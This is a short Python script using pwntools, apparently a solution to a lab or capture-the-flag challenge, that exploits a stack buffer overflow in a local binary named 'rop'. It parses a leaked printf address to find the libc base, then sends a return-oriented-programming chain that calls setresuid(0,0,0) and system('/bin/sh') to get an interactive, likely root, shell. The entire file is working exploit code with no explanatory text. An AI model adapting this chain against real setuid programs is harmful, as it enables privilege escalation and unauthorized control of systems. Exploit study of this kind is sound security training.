from pwn import *
from struct import *

#/lib/x86_64-linux-gnu/libc-2.28.so
libcbase_printf_offset = 0x58770
libcbase_system_offset = 0x44c50
libcbase_setresuid_offset = 0xc7b60

binsh_offset = 0x181519

pop_rdi_ret = 0x55555555526b
pop_rsi_ret = 0x555555555269
pop_rdx_ret_offset = 0x106ad9

r = process('./rop')

r.recvn(8)
r.recvuntil('Printf() at address : ')
libcbase = int(r.recvuntil('\n'),16)
libcbase -= libcbase_printf_offset

payload = "A"*72
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(libcbase + pop_rdx_ret_offset)
payload += p64(0)
payload += p64(0)
payload += p64(libcbase + libcbase_setresuid_offset)

payload += p64(pop_rdi_ret)
payload += p64(libcbase + binsh_offset)
payload += p64(libcbase + libcbase_system_offset)

r.send(payload)
r.interactive()
